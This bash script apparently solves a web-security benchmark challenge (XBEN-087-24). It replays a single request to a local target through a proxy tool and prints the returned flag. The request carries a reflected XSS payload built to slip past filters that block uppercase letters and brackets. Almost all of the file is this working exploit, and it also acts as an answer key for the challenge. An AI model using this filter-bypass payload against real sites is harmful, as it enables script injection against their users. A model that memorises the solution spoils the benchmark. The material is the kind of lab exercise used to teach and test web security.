#!/usr/bin/env bash
# XBEN-087-24 — reflected XSS. Proxy-mode twin. The target validates the
# payload server-side and returns the flag when it would execute, so the attack
# is one replayed request carrying the payload.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben-087-xss-no-uppercase-no-bracketsp-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set method=GET --set path=/page \
  --set query.name='\";p=escape(name).substr(0,1);alert(unescape(p+5+8+p+5+3+p+5+3));//' >/dev/null
print_flag
